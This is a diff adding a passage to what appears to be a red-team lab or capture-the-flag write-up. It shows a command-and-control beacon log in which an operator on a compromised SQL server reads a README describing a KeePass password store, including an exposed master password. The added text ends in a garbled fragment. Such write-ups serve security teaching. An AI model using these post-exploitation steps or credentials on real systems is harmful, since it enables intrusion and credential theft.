@@ -80,4 +80,41 @@ The SQL server is now compromised
 
 ![](Pasted%20image%2020260419154955.png)
 
-Found a keepass databas
+Found a keepass database and a read me
+
+```python
+[19/04 15:50:38] operator [c5311829] beacon > cat README.txt
+[19/04 15:50:38] [*] Task: read file
+[19/04 15:50:41] [*] Agent called server, sent [27 bytes]
+[19/04 15:50:41] [+] 'README.txt' file content:
+﻿Darkhaven Technologies - IT Department Password Store
+======================================================
+File   : it_passwords.kdbx
+Format : KeePass 2.x
+
+Contents:
+  - Network Infrastructure
+      > Core Switch (sw-core-01)
+      > Firewall Admin (fw-ext-01)
+      > Out-of-Band Management (OOBM)
+  - Servers
+      > Domain Controller (dc.ext.darkhaven.local)
+      > SQL Server (sql.ext.darkhaven.local)
+      > Backup Server (bkp-01.ext.darkhaven.local)
+  - Service Accounts
+      > sql_svc           (SQL Server service account)
+      > svc_backup        (Veeam Backup)
+      > svc_monitoring    (SCOM data collector)
+      > svc_webpool       (IIS application pool)
+      > svc_sccm          (SCCM network access)
+  - Cloud / SaaS
+      > Azure Portal
+      > Microsoft 365 Admin Center
+      > Cloudflare DNS
+
+IMPORTANT: Do not copy outside the management VLAN.
+Access requests: it-security@darkhaven.local
+
+Master Password: D@rkhav3n_IT_2024!
+```
+Its gifg
